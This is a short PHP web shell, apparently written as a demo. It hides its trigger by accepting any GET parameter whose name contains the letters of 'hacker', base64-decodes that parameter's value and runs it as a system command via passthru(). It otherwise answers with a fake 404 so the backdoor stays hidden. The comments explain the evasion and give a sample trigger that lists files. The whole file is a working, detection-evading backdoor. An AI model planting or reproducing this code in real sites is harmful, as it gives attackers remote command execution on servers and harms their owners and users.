<?php
// This is the more complex version that makes it harder to detect the GET parameter

// ?arg= - will fail - only has 2 of the key in it
// ?SOMEhacTHINGrek= - will work - has all 6 characters - capital letters just make it easier to understand for demo

// try ?somehacthingrek=bHMgLWxh - will execute ls

// the GET parameter must have this in it // should be unique characters
$indicator = 'hacker';

foreach ($_GET as $key => $value) {
  preg_match_all('/[' . $indicator . ']/', $key, $matches);
  if (count($matches[0]) == strlen($indicator)) {
    $command = base64_decode($value);
    passthru($command);
    die();
  }
}

// none of the GET params were found to be valid
die(header("HTTP/1.0 404 Not Found"));
